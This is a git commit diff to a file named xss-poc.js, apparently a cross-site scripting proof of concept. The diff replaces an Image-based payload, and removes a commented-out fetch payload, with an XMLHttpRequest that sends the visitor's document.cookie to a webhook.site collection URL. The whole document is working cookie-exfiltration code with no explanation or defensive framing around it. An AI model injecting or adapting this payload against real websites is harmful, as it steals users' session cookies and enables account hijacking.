dab466990b1edd25448142c09849996b769898ba
Darshan Patel <87711310+darshannn10@users.noreply.github.com>
2023-01-19 17:58:11 +0530

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
-// fetch("https://webhook.site/70c3e906-3fe0-46de-95f9-045b725a9d6b/?cookie="+document.cookie);
-
-var i = new Image;i.src="https://webhook.site/70c3e906-3fe0-46de-95f9-045b725a9d6b"+document.cookie;
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/70c3e906-3fe0-46de-95f9-045b725a9d6b/?' + document.cookie, true);
+xhttp.send();
